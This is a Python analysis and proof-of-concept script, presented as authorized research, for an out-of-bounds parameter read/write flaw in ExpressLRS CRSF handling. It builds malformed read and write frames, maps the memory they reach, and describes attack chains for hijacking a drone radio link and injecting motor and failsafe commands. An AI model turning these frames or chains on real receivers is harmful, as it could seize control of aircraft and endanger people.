#!/usr/bin/env python3
"""
CRSF Parameter Indexing OOB Read/Write (ELRS PR #3825)

ELRS's MSP-over-CRSF parameter access (used by Lua scripts, Backpack,
and configurators) has unchecked array indexing that allows out-of-bounds
read and write via fieldChunk and parameter index values.

The vulnerability is in the ELRS CRSF parameter handling code:
  - Parameters are stored in arrays indexed by field ID
  - The fieldChunk mechanism allows multi-chunk parameter read/write
  - Neither the parameter index nor the fieldChunk offset is bounds-checked
  - An attacker with CRSF access can read/write beyond the parameter array

This was partially addressed in ELRS PR #3825, but:
  - The fix only adds bounds checking on some paths
  - The Lua configuration interface still passes indices without validation
  - For SPI-integrated receivers (TinyHawk), the CRSF path is internal
    (SPI bus, not UART), so the attack surface is FC-local

Attack path:
  OTA (ELRS link) → CRSF type 0x7A (MSP) → parameter read/write
  → unchecked index → OOB access in ELRS parameter array

Related: ELRS uses a flat parameter table for all configurable fields:
  - Binding phrase, rate, power, telemetry ratio, etc.
  - Stored as crsf_parameter_t structs in a contiguous array
  - Out-of-bounds access hits adjacent memory (other globals, heap)

Usage:
  python3 crsf-parameter-indexing-oob.py --analyze
  python3 crsf-parameter-indexing-oob.py --enumerate-params
  python3 crsf-parameter-indexing-oob.py --oob-map
  python3 crsf-parameter-indexing-oob.py --chain

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import sys

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# ELRS parameter table (from ELRS source: src/lib/CONFIG/config.h)
# ---------------------------------------------------------------------------

# CRSF frame types relevant to parameter access
CRSF_TYPES = {
    0x72: {
        "name": "CRSF_FRAMETYPE_PARAMETER_SETTINGS_ENTRY",
        "direction": "TX→RX (response)",
        "description": "Parameter settings entry (chunked)",
    },
    0x73: {
        "name": "CRSF_FRAMETYPE_PARAMETER_READ",
        "direction": "RX→TX (request)",
        "description": "Read parameter by index",
    },
    0x74: {
        "name": "CRSF_FRAMETYPE_PARAMETER_WRITE",
        "direction": "RX→TX (request)",
        "description": "Write parameter by index + value",
    },
    0x7A: {
        "name": "CRSF_FRAMETYPE_MSP_REQ",
        "direction": "Both",
        "description": "MSP request (encapsulated in CRSF)",
    },
    0x7B: {
        "name": "CRSF_FRAMETYPE_MSP_RESP",
        "direction": "Both",
        "description": "MSP response (encapsulated in CRSF)",
    },
    0x7C: {
        "name": "CRSF_FRAMETYPE_MSP_WRITE",
        "direction": "Both",
        "description": "MSP write (encapsulated in CRSF)",
    },
}

# Known ELRS parameter IDs and their function
ELRS_PARAMS = [
    {"id": 1, "name": "Packet Rate", "type": "UINT8", "size": 1,
     "description": "ELRS packet rate selection (25/50/100/150/200/250/333/500 Hz)"},
    {"id": 2, "name": "Telem Ratio", "type": "UINT8", "size": 1,
     "description": "Telemetry ratio (Off, 1:2, 1:4, 1:8, etc.)"},
    {"id": 3, "name": "Switch Mode", "type": "UINT8", "size": 1,
     "description": "Switch encoding mode (Hybrid, Wide, etc.)"},
    {"id": 4, "name": "Model Match", "type": "UINT8", "size": 1,
     "description": "Model match ID (0-63)"},
    {"id": 5, "name": "TX Power", "type": "UINT8", "size": 1,
     "description": "Transmit power level"},
    {"id": 6, "name": "Max Power", "type": "UINT8", "size": 1,
     "description": "Maximum allowed TX power"},
    {"id": 7, "name": "Dynamic Power", "type": "UINT8", "size": 1,
     "description": "Dynamic power control enable"},
    {"id": 8, "name": "VTX Freq", "type": "UINT16", "size": 2,
     "description": "VTX frequency (for SmartAudio control)"},
    {"id": 9, "name": "VTX Power", "type": "UINT8", "size": 1,
     "description": "VTX power level"},
    {"id": 10, "name": "VTX Pitmode", "type": "UINT8", "size": 1,
     "description": "VTX pit mode enable"},
    {"id": 11, "name": "WiFi Connectivity", "type": "COMMAND", "size": 0,
     "description": "Enter WiFi mode command"},
    {"id": 12, "name": "BLE Joystick", "type": "COMMAND", "size": 0,
     "description": "Enter BLE joystick mode command"},
    {"id": 13, "name": "Bind", "type": "COMMAND", "size": 0,
     "description": "Start binding process"},
]

# The vulnerability: fieldChunk mechanism
FIELD_CHUNK_VULN = {
    "mechanism": (
        "CRSF parameters larger than one frame are sent in chunks. The "
        "fieldChunk byte in the parameter read/write frame specifies which "
        "chunk to read/write. The chunk offset is computed as: "
        "offset = fieldChunk * CHUNK_SIZE. If fieldChunk is not bounds-checked, "
        "the offset can exceed the parameter's actual size, reading/writing "
        "adjacent memory."
    ),
    "chunk_size": 56,  # Typical CRSF parameter chunk size
    "max_chunks_legitimate": 4,  # Most params fit in 1-2 chunks
    "max_field_chunk_value": 255,  # uint8_t fieldChunk → 0-255
    "max_offset": 255 * 56,  # = 14,280 bytes beyond parameter start
    "affected_code": "src/lib/CRSF/CRSF.cpp (parameter handling functions)",
    "pr_fix": "ELRS PR #3825 (partial bounds checking)",
}

PARAM_INDEX_VULN = {
    "mechanism": (
        "The parameter index in CRSF_FRAMETYPE_PARAMETER_READ (0x73) and "
        "CRSF_FRAMETYPE_PARAMETER_WRITE (0x74) frames directly indexes into "
        "the parameter array. The maximum legitimate index is ~13, but the "
        "field is uint8_t (0-255). Values above the array size access memory "
        "beyond the parameter table."
    ),
    "param_struct_size": 32,  # Approximate crsf_parameter_t size
    "array_size": 16,  # Typical ELRS param array size (with padding)
    "max_index_value": 255,  # uint8_t → 0-255
    "oob_range_bytes": (255 - 16) * 32,  # = 7,648 bytes OOB
    "what_is_adjacent": [
        "ELRS configuration struct (binding phrase hash, UID, etc.)",
        "Rate/power configuration tables",
        "FHSS sequence state",
        "CRC initializer cached value",
        "Connection state machine variables",
        "MSP handler state",
    ],
}


def crc8_dvbs2(data: bytes) -> int:
    """CRC-8 DVB-S2 used by CRSF."""
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0xD5) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def build_param_read_frame(param_index: int, field_chunk: int = 0) -> bytes:
    """Build a CRSF parameter read request frame."""
    # CRSF frame: [sync] [len] [type] [dest] [origin] [param_index] [field_chunk] [crc]
    sync = 0xC8
    frame_type = 0x73  # PARAMETER_READ
    dest = 0xEE  # ELRS internal
    origin = 0xEA  # Handset

    payload = bytes([frame_type, dest, origin, param_index & 0xFF, field_chunk & 0xFF])
    length = len(payload) + 1  # +1 for CRC
    crc = crc8_dvbs2(payload)

    return bytes([sync, length]) + payload + bytes([crc])


def build_param_write_frame(param_index: int, value: bytes, field_chunk: int = 0) -> bytes:
    """Build a CRSF parameter write frame."""
    sync = 0xC8
    frame_type = 0x74  # PARAMETER_WRITE
    dest = 0xEE
    origin = 0xEA

    payload = bytes([frame_type, dest, origin, param_index & 0xFF, field_chunk & 0xFF]) + value
    length = len(payload) + 1
    crc = crc8_dvbs2(payload)

    return bytes([sync, length]) + payload + bytes([crc])


def analyze_vulnerability():
    """Analyze the parameter indexing vulnerability."""
    print(f"\n{'='*65}")
    print("CRSF PARAMETER INDEXING OOB ANALYSIS")
    print(f"{'='*65}")

    print(f"\n  VULNERABILITY 1: Parameter Index OOB")
    v = PARAM_INDEX_VULN
    print(f"    Mechanism: {v['mechanism']}")
    print(f"    Parameter struct size: ~{v['param_struct_size']} bytes")
    print(f"    Legitimate array size: {v['array_size']} entries")
    print(f"    Max index value: {v['max_index_value']} (uint8_t)")
    print(f"    OOB range: up to {v['oob_range_bytes']:,} bytes beyond array")
    print(f"    Adjacent memory (potential targets):")
    for target in v["what_is_adjacent"]:
        print(f"      - {target}")

    print(f"\n  VULNERABILITY 2: fieldChunk Offset OOB")
    fc = FIELD_CHUNK_VULN
    print(f"    Mechanism: {fc['mechanism']}")
    print(f"    Chunk size: {fc['chunk_size']} bytes")
    print(f"    Legitimate chunks: {fc['max_chunks_legitimate']}")
    print(f"    Max fieldChunk value: {fc['max_field_chunk_value']} (uint8_t)")
    print(f"    Max OOB offset: {fc['max_offset']:,} bytes")
    print(f"    Fix: {fc['pr_fix']}")

    print(f"\n  CRSF frame types used in attack:")
    for ftype, info in CRSF_TYPES.items():
        print(f"    0x{ftype:02X}: {info['name']}")
        print(f"           {info['description']} ({info['direction']})")

    print(f"\n  COMBINED IMPACT:")
    print(f"    Parameter index OOB: read/write {v['oob_range_bytes']:,} bytes past table")
    print(f"    fieldChunk OOB:      read/write {fc['max_offset']:,} bytes past any param")
    print(f"    Both use uint8_t indices with no bounds checking")
    print(f"    Accessible via OTA (MSP-over-CRSF) from a hijacked ELRS session")


def enumerate_params():
    """Enumerate known ELRS parameters and their layout."""
    print(f"\n{'='*65}")
    print("ELRS PARAMETER TABLE")
    print(f"{'='*65}")

    print(f"\n  Known parameters ({len(ELRS_PARAMS)}):")
    for param in ELRS_PARAMS:
        print(f"    [{param['id']:2d}] {param['name']:25s}  {param['type']:8s}  "
              f"{param['size']}B  {param['description']}")

    print(f"\n  Security-relevant parameters:")
    sec_params = [p for p in ELRS_PARAMS if p['name'] in
                  ('Model Match', 'WiFi Connectivity', 'Bind', 'TX Power', 'Max Power')]
    for param in sec_params:
        print(f"    [{param['id']:2d}] {param['name']:25s}  {param['description']}")

    print(f"\n  OOB parameter index examples:")
    for idx in [14, 20, 50, 100, 200, 255]:
        offset = idx * PARAM_INDEX_VULN["param_struct_size"]
        legitimate_end = PARAM_INDEX_VULN["array_size"] * PARAM_INDEX_VULN["param_struct_size"]
        oob_offset = offset - legitimate_end
        print(f"    Index {idx:3d}: offset {offset:5d} bytes "
              f"({oob_offset:+5d} bytes past array end)")

    # Generate example frames
    print(f"\n  Example CRSF parameter read frames:")
    for idx in [1, 13, 50, 255]:
        frame = build_param_read_frame(idx)
        tag = " (legitimate)" if idx <= 13 else " (OOB)"
        print(f"    Index {idx:3d}: {frame.hex()}{tag}")

    print(f"\n  Example CRSF parameter write frames:")
    for idx in [4, 50]:
        value = bytes([0x00])  # single byte write
        frame = build_param_write_frame(idx, value)
        tag = " (model match = 0)" if idx == 4 else " (OOB write)"
        print(f"    Index {idx:3d}: {frame.hex()}{tag}")


def map_oob_targets():
    """Map what OOB parameter access can reach."""
    print(f"\n{'='*65}")
    print("OOB ACCESS TARGET MAP")
    print(f"{'='*65}")

    struct_size = PARAM_INDEX_VULN["param_struct_size"]
    array_end = PARAM_INDEX_VULN["array_size"] * struct_size

    targets = [
        {
            "offset_range": f"{array_end}-{array_end + 64}",
            "index_range": f"{PARAM_INDEX_VULN['array_size']}-{PARAM_INDEX_VULN['array_size'] + 2}",
            "target": "ELRS config struct (rate, power, telemetry settings)",
            "impact": "Modify ELRS operating parameters without Lua/MSP path",
        },
        {
            "offset_range": f"{array_end + 64}-{array_end + 128}",
            "index_range": "18-20",
            "target": "UID/binding state (6-byte UID, binding phrase hash)",
            "impact": "Read UID bytes → derive FHSS sequence + CRC init",
        },
        {
            "offset_range": f"{array_end + 128}-{array_end + 256}",
            "index_range": "20-24",
            "target": "FHSS state (sequence index, channel list, seed)",
            "impact": "Read/modify hop sequence → predictable RF timing",
        },
        {
            "offset_range": f"{array_end + 256}-{array_end + 512}",
            "index_range": "24-32",
            "target": "CRC state (initializer, cached computations)",
            "impact": "Read CRC init → forge valid packets",
        },
        {
            "offset_range": f"{array_end + 512}-{array_end + 1024}",
            "index_range": "32-48",
            "target": "Connection state machine variables",
            "impact": "Manipulate connection/disconnection state",
        },
        {
            "offset_range": f"{array_end + 1024}+",
            "index_range": "48+",
            "target": "MSP handler buffers and state",
            "impact": "Corrupt MSP handling → escalate to MSP command injection",
        },
    ]

    print(f"\n  Parameter array ends at byte offset {array_end}")
    print(f"  OOB access starts at parameter index {PARAM_INDEX_VULN['array_size']}")
    print(f"\n  NOTE: Exact memory layout depends on compiler, optimization level,")
    print(f"  and ELRS version. These ranges are estimated from typical ARM Cortex-M4")
    print(f"  builds. Actual offsets must be confirmed with firmware analysis.")

    for target in targets:
        print(f"\n  Offset {target['offset_range']} (index ~{target['index_range']}):")
        print(f"    Target: {target['target']}")
        print(f"    Impact: {target['impact']}")

    print(f"\n  fieldChunk OOB examples (on legitimate param ID 1):")
    chunk_size = FIELD_CHUNK_VULN["chunk_size"]
    for chunk in [0, 1, 5, 50, 255]:
        offset = chunk * chunk_size
        tag = " (legitimate)" if chunk <= 1 else " (OOB)"
        print(f"    fieldChunk {chunk:3d}: offset {offset:5d} bytes from param 1 start{tag}")
        frame = build_param_read_frame(1, field_chunk=chunk)
        print(f"      Frame: {frame.hex()}")


def analyze_chains():
    """Analyze attack chains using parameter OOB."""
    print(f"\n{'='*65}")
    print("ATTACK CHAINS VIA PARAMETER OOB")
    print(f"{'='*65}")

    chains = [
        {
            "id": "PARAM-CHAIN-1",
            "name": "OOB read → UID extraction → full session hijack",
            "severity": "CRITICAL",
            "steps": [
                "1. Hijack ELRS session (partial: need UID[3:5] from SYNC)",
                "2. Send CRSF parameter read with index beyond array",
                "3. Read response contains bytes from ELRS config struct",
                "4. Extract full UID bytes (all 6) from config memory",
                "5. Derive CRC initializer: (UID[4]<<8|UID[5])^3",
                "6. Compute complete FHSS sequence from full seed",
                "7. Full session hijack with complete credentials",
            ],
            "impact": "Escalate from partial UID to full session control",
        },
        {
            "id": "PARAM-CHAIN-2",
            "name": "OOB write → FHSS desync → forced WiFi mode",
            "severity": "HIGH",
            "steps": [
                "1. Hijack ELRS session momentarily",
                "2. Send CRSF parameter write with OOB index targeting FHSS state",
                "3. Corrupt FHSS sequence index or channel list",
                "4. TX and RX desynchronize — link drops",
                "5. After 60s timeout, TX enters WiFi mode",
                "6. Proceed with CSRF firmware attack (see esp32-csrf-firmware-rce.py)",
            ],
            "impact": "Forced WiFi mode entry without RF jamming",
        },
        {
            "id": "PARAM-CHAIN-3",
            "name": "OOB write → CRC init overwrite → accept forged packets",
            "severity": "CRITICAL",
            "steps": [
                "1. Hijack ELRS session",
                "2. Send CRSF parameter write targeting CRC init in memory",
                "3. Overwrite CRC initializer to attacker-known value",
                "4. RX now accepts packets with attacker's CRC",
                "5. Attacker can inject arbitrary packets without knowing original UID",
                "6. Combined with model match bypass: full RC command injection",
            ],
            "impact": "Bypass CRC authentication entirely via memory corruption",
        },
        {
            "id": "PARAM-CHAIN-4",
            "name": "OOB write → MSP handler corruption → command injection",
            "severity": "HIGH",
            "steps": [
                "1. Access CRSF parameter write path",
                "2. Write to OOB index targeting MSP handler state/buffers",
                "3. Corrupt MSP state machine to accept unauthorized commands",
                "4. Or: inject pre-built MSP command into handler buffer",
                "5. MSP command executes with full FC privileges",
                "6. Available: motor control, failsafe, DFU reboot, etc.",
            ],
            "impact": "MSP command injection via memory corruption",
        },
    ]

    for chain in chains:
        print(f"\n  [{chain['severity']}] {chain['id']}: {chain['name']}")
        for step in chain["steps"]:
            print(f"    {step}")
        print(f"    Impact: {chain['impact']}")

    print(f"\n  ASSESSMENT:")
    print(f"    The parameter indexing OOB provides an information leak (read)")
    print(f"    and a write primitive (write) that targets ELRS internal state.")
    print(f"    The most dangerous path is PARAM-CHAIN-1: reading the full UID")
    print(f"    from config memory eliminates the need for binding phrase cracking")
    print(f"    or brute-force. With the UID, everything else (CRC, FHSS, model")
    print(f"    match) is derived trivially.")
    print(f"\n    For SPI-integrated receivers (TinyHawk III Plus), the CRSF path")
    print(f"    is internal to the FC, so parameter access requires OTA access")
    print(f"    first. For UART ELRS receivers, the CRSF path is exposed on the")
    print(f"    serial bus — any device on the same bus can send parameter frames.")


def main():
    parser = argparse.ArgumentParser(
        description="CRSF Parameter Indexing OOB Analysis (ELRS PR #3825)"
    )
    parser.add_argument(
        "--analyze", action="store_true",
        help="Analyze the parameter indexing vulnerability",
    )
    parser.add_argument(
        "--enumerate-params", action="store_true",
        help="Enumerate known ELRS parameters",
    )
    parser.add_argument(
        "--oob-map", action="store_true",
        help="Map OOB access targets in adjacent memory",
    )
    parser.add_argument(
        "--chain", action="store_true",
        help="Analyze attack chains using parameter OOB",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    args = parser.parse_args()

    print("CRSF Parameter Indexing OOB Analysis")
    print(f"Reference: ELRS PR #3825 (partial fix)")
    print(f"Attack path: OTA → MSP-over-CRSF → parameter read/write → OOB")
    print(f"Affect: All ELRS v3.x receivers (SPI and UART)")

    results = {
        "reference": "ELRS PR #3825",
        "known_params": len(ELRS_PARAMS),
        "param_index_oob_range": f"{PARAM_INDEX_VULN['oob_range_bytes']} bytes",
        "field_chunk_oob_range": f"{FIELD_CHUNK_VULN['max_offset']} bytes",
    }

    if args.analyze:
        analyze_vulnerability()

    if args.enumerate_params:
        enumerate_params()

    if args.oob_map:
        map_oob_targets()

    if args.chain:
        analyze_chains()

    if not any([args.analyze, args.enumerate_params, args.oob_map, args.chain]):
        analyze_vulnerability()
        enumerate_params()
        map_oob_targets()
        analyze_chains()

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
